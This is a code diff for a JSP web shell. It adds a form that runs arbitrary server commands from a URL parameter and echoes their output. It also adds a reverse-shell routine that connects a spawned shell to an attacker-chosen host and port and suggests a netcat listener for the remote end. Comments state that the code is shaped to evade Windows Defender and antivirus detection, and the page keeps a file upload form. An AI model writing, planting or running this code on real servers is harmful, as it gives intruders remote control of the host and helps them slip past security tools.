@@ -48,15 +48,49 @@
   font: 1.3rem Inconsolata, monospace;
   
   font-size: xx-large;" >
+  
+<% final String command = request.getParameter("command"); %>
+<% if(null != command && !command.isEmpty()) { %>
+<h3>Command Output (STDOUT & STDERR)</h3>
+<pre>
+<% }
+	// Windows Defender sees a file.jsp with exec() and flags it as a virus so we use a trick to evade that
+	// it also handily redirects STDERR to STDOUT
+	
+	if(null != request.getParameter("command") && !command.isEmpty()) {
+		final ProcessBuilder pb = new ProcessBuilder(command.split(" "));
+		pb.redirectErrorStream(true);
+		final Process p = pb.start();
+		p.getOutputStream().close();  // close STDIN
+		final BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
+		for(String cLine = stdout.readLine(); null != cLine; cLine = stdout.readLine()) {
+			out.println(clean(cLine));
+		}
+		stdout.close();
+		
+		p.waitFor();
+		out.println();
+		out.print("<i>");
+		out.print("Exit code was:  " + p.exitValue());
+		out.println("</i>");
+	}
+	
+	if(null != command && !command.isEmpty()) { %>
+</pre>
+<%  } %>
+
+<hr />
 
 <form action="" method="GET">
-<label>Command:</label><input type="text" name="command" size="100" value="<%= clean(request.getParameter("command")) %>"/><input type="submit" />
+<label>Command:</label><input type="text" name="command" size="100" value="<%= clean(request.getParameter("command")) %>" autofocus onfocus="this.selectionStart = this.selectionEnd = this.value.length;" /><input type="submit" />
 </form>
 
 <p>
 You may want to prefix your command with <code>cmd /c</code> or <code>bash -c</code><br />
 STDERR will automatically be redirected to STDOUT for you. Newlines may be translated by server's local platform.
 </p>
+
+<hr />
 
 <script type="text/javascript">
 	function readFile(file) {
@@ -96,11 +130,8 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 <input type="submit" value="Upload"/>
 </form>
 
-<hr />
 <%
 	if("POST".equals(request.getMethod())) {
-		out.println("<pre>");
-		
 		String requestContent = "";
 		
 		final BufferedReader requestReader = new BufferedReader(new InputStreamReader(request.getInputStream()));
@@ -147,8 +178,6 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 		
 		//out.println("DEBUG");
 		//out.println("|||" + requestContent + "|||");
-		
-		out.println("</pre>");
 	}
 %>
 
@@ -172,43 +201,68 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 	if(null == providedAddress || providedAddress.isEmpty()) {
 		providedAddress = request.getRemoteAddr();
 	}
+	
+	String providedPortStr = request.getParameter("port");
+	if(null == providedPortStr || providedPortStr.isEmpty()) {
+		providedPortStr = "4444";
+	}
+	
+	final int providedPort = Integer.parseInt(providedPortStr);
 %>
 <label>Shell:</label><input type="text" name="shell" size="100" value="<%= clean(providedShell) %>"/><br />
 <label>Hostname or IP Address:</label><input type="text" name="address" size="100" value="<%= clean(providedAddress) %>"/><br />
-<label>Port:</label><input type="text" name="port" size="6" value="<%= 4444 %>"/><br />
+<label>Port:</label><input type="text" name="port" size="6" value="<%= providedPort %>"/><br />
 <br />
-<input type="submit" value="Connect" />
+<input type="submit" name="reverseshell" value="Connect" /><span style="font-size: small;">Remote end works well with nc -lknvvvp <%= providedPort %></span>
 </form>
 
-<hr />
-
-<h3>Command Output (STDOUT & STDERR)</h3>
-<pre>
 <%
-	final String command = request.getParameter("command");
+	if("Connect".equals(request.getParameter("reverseshell"))) {
+		out.println("Starting reverse shell");
+		out.println("Connecting to " + providedAddress + ":" + providedPort);
+		
+		class StreamConnector extends Thread {
+			InputStream is;
+			OutputStream os;
 
-	// Windows Defender sees a file.jsp with exec() and flags it as a virus so we use a trick to evade that
-	// it also handily redirects STDERR to STDOUT
-	
-	if(null != request.getParameter("command") && !command.isEmpty()) {
-		final ProcessBuilder pb = new ProcessBuilder(command.split(" "));
+			StreamConnector(InputStream is, OutputStream os) {
+				this.is = is;
+				this.os = os;
+			}
+
+			public void run() {
+				BufferedReader in = null;
+				BufferedWriter out = null;
+				try { in = new BufferedReader(new InputStreamReader(this.is));
+					out = new BufferedWriter(new OutputStreamWriter(this.os));
+					char buffer[] = new char[8192];
+					int length;
+					while ((length = in .read(buffer, 0, buffer.length)) > 0) {
+						out.write(buffer, 0, length);
+						out.flush();
+					}
+				} catch (Exception e) {}
+				try {
+					if ( in != null)
+						in .close();
+					if (out != null)
+						out.close();
+				} catch (Exception e) {}
+			}
+		}
+		
+		
+		Socket socket = new Socket(providedAddress, providedPort);
+
+		// This better evades AV
+		final ProcessBuilder pb = new ProcessBuilder(providedShell);
 		pb.redirectErrorStream(true);
 		final Process p = pb.start();
-		p.getOutputStream().close();  // close STDIN
-		final BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
-		for(String cLine = stdout.readLine(); null != cLine; cLine = stdout.readLine()) {
-			out.println(clean(cLine));
-		}
-		stdout.close();
-		
-		p.waitFor();
-		out.println();
-		out.print("<i>");
-		out.print("Exit code was:  " + p.exitValue());
-		out.println("</i>");
+		( new StreamConnector( p.getInputStream(), socket.getOutputStream() ) ).start();
+		( new StreamConnector( socket.getInputStream(), p.getOutputStream() ) ).start();
+		// As it is a multi-thread operation we don't need to p.waitFor()
 	}
 %>
-</pre>
 
 <hr />
 
